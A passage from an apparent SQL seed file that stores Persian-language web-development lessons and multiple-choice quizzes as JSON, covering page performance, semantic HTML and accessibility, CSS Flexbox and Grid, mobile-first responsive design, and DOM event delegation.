بگیر."},{"k":"h","t":"جمع‌بندی درس"},{"k":"list","items":["قبل از کد، شبکه: DNS، TCP و TLS — اتصال‌های ماندگار (HTTP/2-3) هزینه‌شان را پخش می‌کنند.","CSS رندر را و JS پارس را مسدود می‌کند؛ استراتژی: CSS حیاتی زود، JS با defer.","سرعت یعنی بودجه: LCP زیر ۲٫۵ ثانیه، INP زیر ۲۰۰ میلی‌ثانیه، CLS زیر ۰٫۱."]}]'::jsonb, '[{"q":"چرا CSS «مسدودکننده رندر» است؟","opts":["چون سنگین است","چون مرورگر بدون CSSOM کامل، درخت رندر را نمی‌سازد و صفحه را نقاشی نمی‌کند — تا استایل‌ها معلوم نشوند، ظاهر صفحه تعریف ندارد","چون قدیمی است","فقط در موبایل"],"ans":1,"why":"نقاشی صفحه‌ای که استایلش هنوز نرسیده، یعنی نمایش لحظه‌ای ظاهر غلط (FOUC) — مرورگر ترجیح می‌دهد صبر کند؛ پس CSS حیاتی باید کوچک و زود برسد."},{"q":"تفاوت defer و async چیست؟","opts":["فرقی ندارند","defer بعد از پارس کامل و با حفظ ترتیب اجرا می‌شود؛ async به‌محض دانلود و بدون تضمین ترتیب","async امن‌تر است","defer فقط برای ماژول‌هاست"],"ans":1,"why":"برای اسکریپت‌هایی که به هم یا به DOM وابسته‌اند defer لازم است؛ async فقط برای چیزهای مستقل مثل آمار مناسب است."},{"q":"CLS (جابه‌جایی چیدمان) معمولاً از کجا می‌آید؟","opts":["HTML زیاد","عناصری که بعداً اندازه‌شان معلوم می‌شود: تصویر بدون ابعاد، فونت دیررس، بنر تبلیغاتی","سرور کند","جاوااسکریپت زیاد"],"ans":1,"why":"وقتی جای دکمه‌ای زیر پای کاربر عوض شود، تجربه خراب است؛ راه‌حل‌ها: width/height برای تصویر، font-display: swap و رزرو فضا برای محتوای دیررس."}]'::jsonb),
('web-r2', 'web', 'HTML معنایی؛ اسکلت وب و دروازه دسترسی‌پذیری', 55, 2, '[{"k":"p","t":"HTML فقط «نمایش متن» نیست — زبانی است که معنای محتوا را توصیف می‌کند. همین معناست که موتور جست‌وجو صفحه‌ات را می‌فهمد، صفحه‌خوان برای کاربر نابینا می‌خواند و توسعه‌دهنده بعدی ساختار را در یک نگاه می‌بیند. div هیچ معنایی ندارد؛ وبِ پر از div، وبی است که فقط بینایی‌ها می‌فهمندش."},{"k":"h","t":"معنا قبل از نمایش"},{"k":"p","t":"وقتی می‌نویسی <article>، <nav> یا <h2>، سه مخاطب همزمان پیام می‌گیرند: مرورگر (رفتار پیش‌فرض)، موتور جست‌وجو (ساختار محتوا برای رتبه‌بندی) و فناوری‌های کمکی (درخت قابل‌پیمایش برای کاربر). صفحه‌ای که همه‌چیزش div و span است، برای این سه مخاطب یک توده بی‌شکل است. و نکته مهم: ظاهر را CSS می‌دهد، نه تگ — پس هیچ دلیلی ندارد برای «زیبایی» معنا را قربانی کنی؛ هر معنایی را می‌توان هر شکلی درآورد."},{"k":"h","t":"نقاط عطف و ساختار صفحه"},{"k":"p","t":"ساختار استاندارد یک صفحه، چند Landmark دارد: <header> برای سربرگ، <nav> برای ناوبری اصلی، <main> برای محتوای یکتای صفحه (فقط یکی در هر صفحه)، <aside> برای محتوای جانبی و <footer> برای پانوشت. کاربر صفحه‌خوان با یک کلید میانبر مستقیم به هر Landmark می‌پرد — مثل فهرست مطالب یک کتاب. برای محتوا هم سلسله‌مراتب سرفصل‌ها (h1 تا h6) را منطقی نگه دار: h1 یکی است و بعدی‌ها زیرمجموعه‌های منطقی‌اند، نه ابزار بزرگ‌کردن فونت."},{"k":"h","t":"دسترسی‌پذیری عملی؛ قانون اول"},{"k":"p","t":"قانون اول ARIA: اگر عنصر بومی HTML کار را انجام می‌دهد، از ARIA استفاده نکن. دکمه واقعی (<button>) از همان ابتدا کیبورد (Enter و Space)، فوکوس و نقش درست دارد — یک <div onclick> هیچ‌کدام را ندارد و بازسازی‌اش با role و tabindex و keydown یعنی چرخ را دوباره ساختن، و معمولاً ناقص. برای فرم‌ها، هر input یک <label> با for می‌خواهد؛ برای تصویرها، alt که واقعاً توضیح بدهد (و alt=\"\" برای تصاویر تزئینی); و برای محتواهای پویا، live region که تغییرات را اعلام کند."},{"k":"h","t":"مثال حل‌شده"},{"k":"code","lang":"html","title":"یک صفحه خبری معنایی","code":"<body>\n  <header>\n    <img src=\"logo.svg\" alt=\"بیت‌کد\">\n    <nav aria-label=\"ناوبری اصلی\">\n      <ul>\n        <li><a href=\"/courses\" aria-current=\"page\">دوره‌ها</a></li>\n        <li><a href=\"/blog\">وبلاگ</a></li>\n      </ul>\n    </nav>\n  </header>\n\n  <main>\n    <article>\n      <h1>چرا وب هنوز مهم‌ترین سکوی نرم‌افزار است؟</h1>\n      <p><time datetime=\"2026-03-14\">۲۴ اسفند ۱۴۰۴</time></p>\n      <h2>بدون نصب، بدون مرز</h2>\n      <p>...</p>\n      <figure>\n        <img src=\"chart.avif\" alt=\"نمودار رشد کاربران وب از ۲۰۲۰ تا ۲۰۲۶\">\n        <figcaption>رنگ آبی: کاربران موبایل</figcaption>\n      </figure>\n    </article>\n  </main>\n\n  <footer><p>© ۱۴۰۵ بیت‌کد</p></footer>\n</body>"},{"k":"list","items":["aria-label روی nav وقتی چند ناوبری داری ضروری است — وگرنه کاربر صفحه‌خوان نمی‌داند کدام «nav» کدام است.","aria-current=\"page\" به‌جای فقط کلاس CSS، به فناوری‌های کمکی هم می‌گوید کاربر کجاست.","datetime در <time> ماشین‌خوان است (ISO) و متن فارسی انسان‌خوان — هر دو، بدون تضاد.","alt نمودار، «مفهوم» را می‌گوید نه «نمودار است»؛ و figcaption برای همه، نه فقط کاربران صفحه‌خوان."]},{"k":"def","term":"دسترسی‌پذیری (Accessibility یا a11y)","t":"طراحی و کدی که وب را برای همه قابل‌استفاده می‌کند — شامل کاربران نابینا و کم‌بینا، ناشنوا، کسانی که فقط کیبورد دارند و حتی کسی که زیر نور آفتاب با صفحه کوچک کار می‌کند. a11y لطف نیست؛ بخشی از تعریف «درست کار کردن» است و در بسیاری کشورها الزام قانونی."},{"k":"table","head":["به‌جای این","این را بنویس","چرا"],"rows":[["<div onclick>","<button>","کیبورد، فوکوس و نقش رایگان"],["<div class=\"nav\">","<nav>","قابل‌پیمایش با صفحه‌خوان"],["<b> برای هشدار","<strong> + رنگ","اهمیت معنایی، نه فقط بولد"],["<br><br><br>","margin در CSS","فاصله، نمایش است نه محتوا"]]},{"k":"warn","title":"دام رایج","t":"استفاده از ARIA برای جبران HTML تنبل — مثلاً <div role=\"button\" tabindex=\"0\"> بدون هندل کیبورد. ARIA فقط «اعلان» می‌کند، رفتار نمی‌سازد؛ و اعلانِ دروغ (نقش دکمه بدون عملکرد دکمه) از نبودنش بدتر است چون فناوری کمکی را گمراه می‌کند."},{"k":"tip","title":"نکته حرفه‌ای","t":"یک‌بار با کیبوردِ خالی سایتت را بگرد: Tab، Shift+Tab و Enter. هر جایی که فوکوس گم شد، تله فوکوس بود یا ترتیب منطقی نداشت. ده دقیقه است و بیشتر از هر ابزار خودکار، مشکل واقعی پیدا می‌کند — چون دقیقاً همان کاری است که میلیون‌ها کاربر انجام می‌دهند."},{"k":"h","t":"جمع‌بندی درس"},{"k":"list","items":["تگ معنایی، سه مخاطب دارد: مرورگر، موتور جست‌وجو و فناوری کمکی — div هیچ‌کدام را راضی نمی‌کند.","ساختار صفحه: header، nav، main (یکی)، article/section، footer + سلسله‌مراتب منطقی سرفصل‌ها.","قانون اول ARIA: عنصر بومی کافی است، از آن استفاده کن؛ button واقعی از role=\"button\" کامل‌تر است."]}]'::jsonb, '[{"q":"چرا <button> از <div onclick> بهتر است، حتی اگر ظاهرشان یکی باشد؟","opts":["سریع‌تر رندر می‌شود","رفتارهای کامل را رایگان دارد: فوکوس کیبورد، Enter/Space و اعلام نقش به صفحه‌خوان — بازسازی‌شان روی div همیشه ناقص می‌ماند","SEO بهتر","سبک‌تر است"],"ans":1,"why":"ظاهر را CSS مساوی می‌کند؛ ولی تعامل واقعی (کیبورد + فناوری کمکی) فقط در عنصر بومی کامل است — و کاربران کیبوردی، واقعی‌اند."},{"q":"در یک صفحه چند <main> مجاز است؟","opts":["هرچقدر","دقیقاً یکی — محتوای یکتای صفحه؛ بقیه‌چیزها در header/nav/aside/footer","دوتا: موبایل و دسکتاپ","بستگی به فریم‌ورک دارد"],"ans":1,"why":"main یعنی «محتوایی که این صفحه را این صفحه می‌کند» — اگر دو تا بود، کاربر صفحه‌خوان نمی‌داند محتوای اصلی کدام است. نسخه موبایل/دسکتاپ با CSS حل می‌شود، نه HTML تکراری."},{"q":"alt درست برای تصویر تزئینی چیست؟","opts":["«تصویر»","alt=\"\" — تا صفحه‌خوان کلاً از رویش بپرد و کاربر را با اطلاعات بی‌ارزش خسته نکند","حذف alt","توضیح کامل"],"ans":1,"why":"alt خالی یعنی «این تزئینی است، رد شو» — حذف کامل alt خطا می‌سازد و مرورگر ممکن است نام فایل را بخواند که بدتر از سکوت است."}]'::jsonb),
('web-r3', 'web', 'CSS مدرن؛ مدل جعبه، Flexbox و Grid به‌عنوان ابزار فکر', 70, 3, '[{"k":"p","t":"سال‌ها چیدمان در CSS یعنی float و ترفند و ناامیدی — تا اینکه Flexbox و Grid رسیدند و چیدمان از «جنگ با مرورگر» به «بیان نیت» تبدیل شد. ولی هنوز خیلی‌ها با این دو ابزار، مثل چکش و اره با یک کار مواجه می‌شوند؛ فرق‌شان را که بفهمی، هر چیدمانی یک تصمیم ساده است."},{"k":"h","t":"مدل جعبه؛ همه‌چیز یک جعبه است"},{"k":"p","t":"هر عنصر در CSS یک جعبه مستطیلی است با چهار لایه: محتوا، padding (فضای داخلی)، border و margin (فضای بیرونی). دو تصمیم تاریخی: در مدل content-box، عرض فقط محتواست و padding به آن «اضافه» می‌شود — و محاسبات را جهنمی می‌کند؛ در border-box، عرضِ اعلام‌شده شامل padding و border است و ذهن و کد هم‌راستا می‌شوند. به همین دلیل * { box-sizing: border-box } اولین خط تقریباً هر پروژه مدرن است و بدون آن، هرچیز ساده‌ای هم کمی سخت می‌شود."},{"k":"h","t":"Flexbox؛ یک بُعد، توزیع هوشمند"},{"k":"p","t":"Flexbox برای یک محور است: یک ردیف یا یک ستون. والد می‌گوید جهت (flex-direction)، نقطه شروع و پایانِ محتوا چطور پخش شود (justify-content) و عناصر در محور عمود چطور تراز شوند (align-items). فرزندان هم حق رأی دارند: grow (چقدر بزرگ شوند)، shrink (چقدر کوچک شوند) و basis (اندازه اولیه). قدرت واقعی‌اش در «توزیع» است: space-between، center، یا grow نابرابر — همه با یک خط. نوار ابزار، کارت‌های هم‌ارتفاع، وسط‌کردنِ معروف — همه کار Flexboxاند."},{"k":"h","t":"Grid؛ دو بُعد، نقشه‌کشی واقعی"},{"k":"p","t":"Grid صفحه را مثل نقشه‌کشی شهر تعریف می‌کند: اول ستون‌ها و ردیف‌ها را می‌سازی (grid-template-columns)، بعد هر عنصر می‌گوید کجای این نقشه خانه دارد. واحد fr سهمِ فضای باقی‌مانده است: 1fr 2fr یعنی دومی دو برابر اولی. ترکیب minmax(250px, 1fr) با repeat(auto-fit, ...) همان «گالری ریسپانسیو بدون حتی یک Media Query» است: ستون‌ها خودشان تا جا دارند ساخته می‌شوند و حداقل ۲۵۰ پیکسل تضمین شده. قاعده عملی: ساختار دوبُعدی صفحه = Grid؛ جریان محتوای درون هر بخش = Flexbox — و این دو با هم، نه به‌جای هم."},{"k":"h","t":"مثال حل‌شده"},{"k":"code","lang":"css","title":"سه الگویی که ۸۰٪ چیدمان‌ها را می‌سازند","code":"* { box-sizing: border-box; }   /* خط صفر هر پروژه */\n\n/* الگوی ۱: وسط‌کردن کامل — با یک خط */\n.hero {\n  display: grid;\n  place-items: center;      /* = align + justify */\n  min-height: 80vh;\n}\n\n/* الگوی ۲: گالری ریسپانسیو بدون Media Query */\n.gallery {\n  display: grid;\n  grid-template-columns:\n    repeat(auto-fit, minmax(240px, 1fr));\n  gap: 16px;\n}\n\n/* الگوی ۳: کارت — Grid برای ساختار، Flex برای پا */\n.card {\n  display: grid;\n  grid-template-rows: auto 1fr auto; /* سر، بدنه کش‌سان، پا */\n}\n.card__footer {\n  display: flex;\n  justify-content: space-between;\n  align-items: center;\n  gap: 12px;\n}"},{"k":"list","items":["place-items: center مخفف align-items و justify-items است — وسط‌کردن عمودی و افقی که سال‌ها با ترفند انجام می‌شد.","auto-fit + minmax یعنی «ستون بساز تا جا داری، هرکدام حداقل ۲۴۰px» — در موبایل یک ستون، در دسکتاپ چهار تا؛ همه خودکار.","grid-template-rows: auto 1fr auto تضمین می‌کند پای همه کارت‌ها هم‌تراز است، حتی اگر طول متن متفاوت باشد — 1fr فضای وسط را می‌بلعد.","پای کارت یک‌بُعدی است، پس Flexbox — و space-between قیمت و دکمه را به دو سر می‌راند. ابزار درست برای بُعد درست."]},{"k":"def","term":"اندازه‌گذاری ذاتی (Intrinsic Sizing)","t":"رویکرد مدرن CSS که به‌جای تحمیل اندازه‌های ثابت، از خودِ محتوا اجازه می‌گیرد: min-content (کوچک‌ترین اندازه بدون شکستن)، max-content (بدون هیچ شکستنی) و fit-content (هرچه لازم است، نه بیشتر). با clamp() برای تایپوگرافی و minmax() در Grid، طرح‌ها به‌جای اینکه در breakpoints «بشکنند و دوباره چیده شوند»، پیوسته «کش می‌آیند» — و این، تعریف ریسپانسیو واقعی است."},{"k":"table","head":["مسئله","ابزار","چرا"],"rows":[["ساختار کلی صفحه","Grid","دوبُعدی: سربرگ/کنار/محتوا/پا همزمان"],["نوار ابزار و دکمه‌ها","Flexbox","یک‌بُعدی با توزیع هوشمند"],["وسط‌کردن کامل","Grid + place-items","یک خط، بدون ترفند"],["گالری ریسپانسیو","Grid + auto-fit","بدون Media Query"],["هم‌ارتفاع‌کردن ستون‌ها","Grid","ردیف مشترک = ارتفاع مشترک"]]},{"k":"warn","title":"دام رایج","t":"زدن display: grid و بعد جنگیدن با آیتم‌ها مثل Flexbox — یا برعکس، ساختن ساختار دوبُعدی صفحه با Flexهای تو در تو. نشانه‌اش: position: absolute و marginهای جادویی که «کار می‌کنند ولی کسی نمی‌داند چرا». اگر چیدمان سخت شده، احتمالاً ابزار اشتباه انتخاب شده، نه اینکه CSS سخت باشد."},{"k":"tip","title":"نکته حرفه‌ای","t":"در دیوتولز کروم، کنار نمایشگر هر عنصرِ grid یا flex یک نشان badge ظاهر می‌شود؛ رویش کلیک کن تا خطوط راهنما و شماره خطوط گرید روی صفحه کشیده شود. دیدنِ خطوط، فهم grid-template را از حفظ‌کردن به دیدن تبدیل می‌کند — و برای دیباگ چیدمان، سریع‌ترین راه موجود است."},{"k":"h","t":"جمع‌بندی درس"},{"k":"list","items":["box-sizing: border-box خط صفر؛ بعد از آن، عرض یعنی واقعاً عرض.","Flexbox برای یک بُعد و توزیع؛ Grid برای دوبُعد و نقشه — با هم، نه به‌جای هم.","repeat(auto-fit, minmax(...)) + gap: ریسپانسیو ذاتی، بدون Media Query."]}]'::jsonb, '[{"q":"چرا box-sizing: border-box محاسبات را ساده می‌کند؟","opts":["سریع‌تر رندر می‌شود","عرض اعلام‌شده شامل padding و border می‌شود — پس width: 300px واقعاً ۳۰۰ پیکسل فضا می‌گیرد و ذهن و کد هم‌راستا می‌شوند","margin را حذف می‌کند","فقط در Grid لازم است"],"ans":1,"why":"در content-box، هر padding عدد دیگری را خراب می‌کند؛ با border-box می‌توانی بگویی «یک‌سوم عرض» و مطمئن باشی سه‌تا کنار هم دقیقاً جا می‌شوند."},{"q":"repeat(auto-fit, minmax(240px, 1fr)) چه می‌کند؟","opts":["۲۴۰ ستون می‌سازد","تا جا دارد ستون می‌سازد که هرکدام حداقل ۲۴۰px و در توزیع فضا شریک‌اند — گالری ریسپانسیو بدون Media Query","فقط در موبایل کار می‌کند","ستون‌ها را ثابت نگه می‌دارد"],"ans":1,"why":"auto-fit می‌شمارد چند ستونِ حداقل ۲۴۰px جا می‌شود؛ 1fr فضای باقی‌مانده را بینشان تقسیم می‌کند. تغییر عرض پنجره = تغییر خودکار تعداد ستون."},{"q":"کی Grid و کی Flexbox؟","opts":["Grid همیشه بهتر است","ساختار دوبُعدی و نقشه‌کشی = Grid؛ جریان یک‌بُعدی و توزیع محتوا = Flexbox — و داخل هر بخش Grid معمولاً Flexbox نشسته","فرقی ندارند","Flexbox قدیمی شده"],"ans":1,"why":"این دو مکمل‌اند: Grid می‌گوید «خانه‌ها کجا»، Flexbox می‌گوید «وسایل داخل خانه چطور». صفحه‌های مدرن تقریباً همیشه ترکیب هر دو هستند."}]'::jsonb),
('web-r4', 'web', 'ریسپانسیو واقعی؛ موبایل‌اول و چیدمان‌های سیال', 55, 4, '[{"k":"p","t":"بیش از ۶۰٪ ترافیک وب از موبایل می‌آید، ولی بیشتر سایت‌ها هنوز اول برای دسکتاپ طراحی می‌شوند و بعد «کوچک» می‌شوند. ریسپانسیو واقعی جهتش برعکس است: از کوچک‌ترین صفحه شروع کن و بگذار محتوا خودش بگوید کجا به فضای بیشتری نیاز دارد — نه اینکه دستگاه‌ها را از قبل حدس بزنی."},{"k":"h","t":"موبایل‌اول؛ ترتیبی که همه‌چیز را عوض می‌کند"},{"k":"p","t":"در رویکرد Mobile-First، CSS پایه برای تک‌ستون موبایل نوشته می‌شود و Media Queryها با min-width فقط «اضافه» می‌کنند: از ۶۴۰ پیکسل دو ستون، از ۱۰۲۴ سه ستون. مزیتش فنی است، نه سلیقه‌ای: موبایل سخت‌ترین محدودیت‌ها را دارد (صفحه کوچک، شبکه ضعیف، CPU کم) و طراحی با این محدودیت‌ها، اضافات را از اساس حذف می‌کند — بعد در صفحه بزرگ فقط غنی‌تر می‌شوی. برعکسش (max-width و کم‌کردن از دسکتاپ) همیشه چیزی را جا می‌اندازد و CSS را پر از استثنائات می‌کند."},{"k":"h","t":"واحدها و تایپوگرافی سیال"},{"k":"p","t":"rem را پایه بگیر: همه‌چیز نسبت به فونت ریشه — و فقط با تغییر یک عدد، کل مقیاس عوض می‌شود. ولی جهش واقعی clamp() است: font-size: clamp(1rem, 0.9rem + 1vw, 1.5rem) یعنی فونتی که با عرض صفحه رشد می‌کند، ولی از حداقل و حداکثری که تعیین کردی بیرون نمی‌زند — تایپوگرافی سیال بدون حتی یک Media Query. برای فاصله‌ها هم همین منطق: به‌جای جدول‌های px برای هر breakpoint، مقیاسی مثل 4/8/16/24/32 با clamp بین دو سر. واحدهای جدیدتر هم هستند: dvh ارتفاع واقعیِ دیده‌شده موبایل است (بدون پرشِ نوار آدرس) و viw/vh منطقی‌تر از vh قدیمی."},{"k":"h","t":"تصاویر و نقطه‌شکن‌ها؛ جایی که ریسپانسیو واقعاً تست می‌شود"},{"k":"p","t":"تصویر معمولاً سنگین‌ترین بایت صفحه است و ریسپانسیو کردنش سه ابزار دارد: srcset به مرورگر می‌گوید چه نسخه‌هایی داری، sizes می‌گوید در هر عرض چقدر نمایش داده می‌شود، و مرورگر خودش بهترین را انتخاب می‌کند — نه سرور، نه جاوااسکریپت. برای المان‌های هنری که در موبایل باید برش متفاوت بخورند، <picture> با چند source. و Media Queryها را بر اساس «محتوا» بنویس نه «دستگاه»: اگر کارت در ۵۸۰ پیکسل دیگر جا نمی‌شود، همان‌جا نقطه‌شکن است — نه در ۷۶۸ که روزی اسم آیفون بود."},{"k":"h","t":"مثال حل‌شده"},{"k":"code","lang":"css","title":"یک صفحه، سه رفتار — بدون فریم‌ورک","code":"/* پایه: موبایل، تک‌ستون */\n.cards {\n  display: grid;\n  grid-template-columns: 1fr;\n  gap: 1rem;\n}\n\n/* نقطه‌شکن ۱: جا برای دو ستون هست */\n@media (min-width: 640px) {\n  .cards { grid-template-columns: repeat(2, 1fr); }\n}\n\n/* نقطه‌شکن ۲: سه ستون + تایپوگرافی بزرگ‌تر */\n@media (min-width: 1024px) {\n  .cards { grid-template-columns: repeat(3, 1fr); }\n  h1 { font-size: clamp(2rem, 1.5rem + 2vw, 3.5rem); }\n}\n\n/* تایپوگرافی سیال — بدون Media Query */\np {\n  font-size: clamp(1rem, 0.95rem + 0.4vw, 1.15rem);\n  line-height: 1.9;\n}\n\n/* تصویر پاسخ‌دهنده */\nimg {\n  width: 100%;\n  height: auto;\n  aspect-ratio: 16 / 10;   /* رزرو فضا — ضد CLS */\n  object-fit: cover;\n}"},{"k":"list","items":["ترتیب min-widthها مهم است: چون هر دو می‌توانند درست باشند، قانونِ بعدی باید بعد بیاید تا بر اولی غالب شود (آبشار).","clamp(کف، ترجیح سیال، سقف): وسط معمولاً ترکیب rem + vw است — سیال بین دو کران. در موبایل کف، در دسکتاپ سقف.","aspect-ratio فضا را قبل از رسیدن تصویر رزرو می‌کند — CLS حذف می‌شود و object-fit برش زیبای محتوا را تضمین می‌کند.","line-height: 1.9 برای متن فارسی از انگلیسی بازتر لازم است — حروف کشیده و اعراب به فضای عمودی بیشتری نیاز دارند."]},{"k":"def","term":"موبایل‌اول (Mobile First)","t":"استراتژی طراحی و کد از کوچک‌ترین و محدودترین صفحه به سمت بزرگ‌تر — با Media Queryهای min-width که فقط توانمندی اضافه می‌کنند. منطقش: محدودیت سخت‌گیر را اول حل کن تا ساده‌سازی اجباری شود؛ گسترش به صفحه بزرگ همیشه آسان‌تر از فشرده‌کردن طرح بزرگ است."},{"k":"table","head":["واحد","نسبت به","کاربرد درست"],"rows":[["px","ثابت","ظرافت‌ها: border، سایه — نه فونت و فاصله"],["rem","فونت ریشه","فونت و فاصله — مقیاس‌پذیر با تنظیمات کاربر"],["vw / vh","پنجره","عناصر تمام‌صفحه — با مراقبت از نوار موبایل"],["dvh","ارتفاع دیده‌شده","صفحه‌های تمام‌قد موبایل — بدون پرش"],["fr","فضای باقی‌مانده","ستون‌های Grid — توزیع نسبی"]]},{"k":"warn","title":"دام رایج","t":"نوشتن Media Query بر اساس دستگاه‌های خاص (768px آیپد، 375px آیفون) — سال بعد دستگاه دیگری می‌آید و جدول breakpointهایت دروغ می‌گوید. نقطه‌شکن مال محتوای توست: پنجره را آرام کوچک کن و هر جا طرح شکست، همان عدد breakpoint است."},{"k":"tip","title":"نکته حرفه‌ای","t":"ابزار Device Mode کروم عالی است ولی تله دارد: همه‌چیز را با کش و شبکه سریع شبیه‌سازی می‌کند. برای تست واقعی موبایل، در DevTools تب Network را روی «Slow 3G» بگذار و صفحه را Hard Reload کن — تجربه‌ای که اکثر کاربران جهانی دارند و توسعه‌دهنده‌ها هرگز نمی‌بینند."},{"k":"h","t":"جمع‌بندی درس"},{"k":"list","items":["موبایل‌اول: CSS پایه تک‌ستون، Media Queryها فقط با min-width اضافه می‌کنند.","clamp() تایپوگرافی و فاصله‌های سیال می‌سازد — بدون نقطه‌شکن.","srcset + sizes انتخاب هوشمند تصویر؛ aspect-ratio ضد CLS؛ breakpointها از محتوا، نه از نام دستگاه."]}]'::jsonb, '[{"q":"چرا Mobile-First فنی بهتر است، نه فقط سلیقه؟","opts":["CSS کمتر می‌شود","محدودیت‌های سخت (صفحه، شبکه، CPU) اول حل می‌شوند و طرح از اساس ساده و ضروری می‌ماند؛ گسترش به بزرگ آسان‌تر از فشرده‌کردن است","سریع‌تر رندر می‌شود","گوگل الزام کرده"],"ans":1,"why":"طرحی که از اول برای سخت‌ترین شرایط ساخته شده، ذاتاً سبک‌تر است؛ دسکتاپ‌اول همیشه چیزی را برای کوچک‌کردن جا می‌اندازد و CSS را پر از override می‌کند."},{"q":"clamp(1rem, 0.9rem + 1vw, 1.5rem) چه رفتاری دارد؟","opts":["فونت ثابت ۱rem","با عرض پنجره رشد می‌کند ولی از ۱rem کوچک‌تر و از ۱٫۵rem بزرگ‌تر نمی‌شود — سیالِ مهارشده","فقط در موبایل","به زبان وابسته است"],"ans":1,"why":"آرگومان وسط ترجیح سیال است و دو آرگومان دیگر کران‌ها — یعنی تایپوگرافی که نفس می‌کشد ولی هیچ‌وقت از چارچوب طراحی بیرون نمی‌زند."},{"q":"نقش sizes در srcset چیست؟","opts":["اندازه فایل را می‌گوید","به مرورگر می‌گوید تصویر در هر عرض viewport چقدر نمایش داده می‌شود — تا با srcset بتواند فایل با وضوح مناسب را انتخاب کند","فشرده‌سازی است","فقط برای لازی است"],"ans":1,"why":"بدون sizes، مرورگر نمی‌داند تصویر تمام‌عرض است یا نصف — و ممکن است برای یک تصویر کوچک در موبایل، فایل ۲۰۰۰ پیکسلی دانلود کند. این دو با هم کار می‌کنند."}]'::jsonb),
('web-r5', 'web', 'جاوااسکریپتِ مرورگر؛ DOM، رویدادها و حلقه رویداد', 65, 5, '[{"k":"p","t":"فریم‌ورک‌ها می‌آیند و می‌روند، ولی زیر همه‌شان سه چیز ثابت است: DOM که صفحه را به برنامه تبدیل می‌کند، مدل رویداد که تعامل را ممکن می‌سازد و حلقه رویداد که به جاوااسکریپتِ تک‌رشته‌ای، توهم هم‌زمانی می‌دهد. این سه را که بفهمی، هر فریم‌ورکی برایت شفاف می‌شود — چون همه‌شان روی همین‌ها سوارند."},{"k":"h","t":"DOM؛ درخت زنده‌ی صفحه"},{"k":"p","t":"وقتی مرورگر HTML را پارس می‌کند، یک درخت از گره‌ها می‌سازد که هر تگ یک گره است — و این درخت «زنده» است: هر تغییرش فوراً روی صفحه اثر دارد. document.querySelector مدرن‌ترین راه پیداکردن گره‌هاست (با همان گزینشگرهای CSS) و classList، textContent و append ابزار تغییرش. دو قاعده مهم: تغییر مستقیم DOM گران است (هر تغییر می‌تواند Layout و Paint دوباره راه بیندازد) — پس تغییرها را دسته کن؛ و innerHTML با محتوای کاربر یعنی XSS — برای متن کاربر همیشه textContent."},{"k":"h","t":"حباب رویداد و هیئت‌سپاری"},{"k":"p","t":"کلیک روی دکمه، فقط روی دکمه رخ نمی‌دهد: رویداد از ریشه پایین می‌آید (Capture)، به هدف می‌رسد و بعد حباب‌وار بالا می‌رود (Bubbling). همین حباب است که قدرتمندترین الگوی DOM را ممکن می‌کند: Event Delegation. به‌جای اینکه به هزار ردیف لیست شنونده بزنی، یک شنونده روی والد می‌گذاری و از event.target می‌فهمی کدام فرزند کلیک شده — حافظه کمتر، و ردیف‌هایی که بعداً اضافه می‌شوند خودکار پوشش داده می‌شوند. و stopPropagation فقط وقتی که واقعاً لازم است؛ قطع بی‌مورد حباب، شنونده‌های بالاتر را کور می‌کند."},{"k":"h","t":"حلقه رویداد؛ چرا JS هم‌زمان به‌نظر می‌رسد"},{"k":"p","t":"جاوااسکریپت یک نخ اجرا دارد — ولی حلقه رویداد به آن هم‌زمانی می‌بخشد: کارهای غیرمسدودکننده (تایمرها، درخواست‌های شبکه) به مرورگر سپرده می‌شوند و وقتی آماده شدند، Callbackشان در صف می‌نشیند. ظرافت: دو صف وجود دارد — Microtaskها (Promiseها و await) که بعد از هر Task و قبل از رندر، تا ته خالی می‌شوند، و Macrotaskها (setTimeout، رویدادها) که نوبتی‌اند. نتیجه عملی: یک حلقه for که چند ثانیه کار می‌کند، همه‌چیز — حتی کلیک‌ها و رندر — را قفل می‌کند؛ راه‌حلش شکستن کار با await، setTimeout(0) یا Worker است."},{"k":"h","t":"مثال حل‌شده"},{"k":"code","lang":"js","title":"هیئت‌سپاری رویداد — هزار ردیف، یک شنونده","code":"// ❌ شنونده برای هر ردیف — و ردیف‌های جدید جا می‌مانند!\ndocument.querySelectorAll(''.row__delete'').forEach(btn =>\n  btn.addEventListener(''click'', onDelete));\n\n// ✓ یک شنونده روی والد — فعلی و آینده‌ها پوشش دارند\nconst list = document.querySelector(''#todo-list'');\n\nlist.addEventListener(''click'', (e) => {\n  // کدام دکمه؟ — حباب رویداد جواب می‌دهد\n  const btn = e.target.closest(''.row__delete'');\n  if (!btn) return;                     // کلیک جای دیگری بود\n\n  const row = btn.closest(''.row'');      // ردیفِ صاحب دکمه\n  const id = row.dataset.id;            // <li data-id=\"42\">\n\n  api.delete(id).then(() => row.remove());\n});\n\n// حتی ردیف‌هایی که بعداً با innerHTML اضافه شوند،\n// بدون هیچ کد اضافی کار می‌کنند — چون والد همان است."},{"k":"list","items":["closest() از هدفِ کلیک به‌سمت بالا می‌گردد تا نزدیک‌ترین جدِ با این کلاس — حتی اگر کلیک روی آیکونِ داخل دکمه باشد، درست عمل می‌کند.","return زودهنگام برای کلیک‌های غیرمرتبط: رویداد همیشه به والد می‌رسد، ولی همیشه مال ماست نه.","data-id روی عنصر یعنی state در DOM — ساده برای المان‌های لیست؛ برای state پیچیده‌تر، یک Map با کلید id بهتر است.","row.remove() بعد از موفقیت API — نه قبلش؛ خوش‌بینی خوب است ولی بدون Rollback، یعنی ردیف‌های زامبی وقتی شبکه قطع است."]},{"k":"def","term":"هیئت‌سپاری رویداد (Event Delegation)","t":"الگوی گذاشتن یک شنونده روی جد مشترک به‌جای شنونده برای هر فرزند — با تکیه بر حباب رویداد و event.target. سه برد: حافظه کمتر، پوشش خودکار عناصر دینامیک، و یک نقطه مدیریت برای منطق. تقریباً هر فریم‌ورکی که «اتوماتیک» رویدادها را مدیریت می‌کند، در دلش همین ایده را دارد."},{"k":"table","head":["مفهوم","چیست","نتیجه عملی"],"rows":[["Bubbling","رویداد از هدف به ریشه بالا می‌رود","Delegation ممکن می‌شود"],["Capturing","رویداد از ریشه به هدف پایین می‌آید","با {capture: true} — برای میانجی‌گری"],["Microtask","Promise/await بعد از هر Task","صفش قبل از رندر خالی می‌شود — حلقه بی‌پایان Promise = فریز"],["Macrotask","setTimeout، رویدادها، I/O","بین هر دو Task، فرصت رندر هست"]]},{"k":"warn","title":"دام رایج","t":"خواندن DOM در حلقه و نوشتنِ لابه‌لای آن (layout thrashing): هر offsetWidth بعد از یک تغییر، مرورگر را مجبور به Layout اجباری می‌کند. الگوی درست: اول همه خواندن‌ها، بعد همه 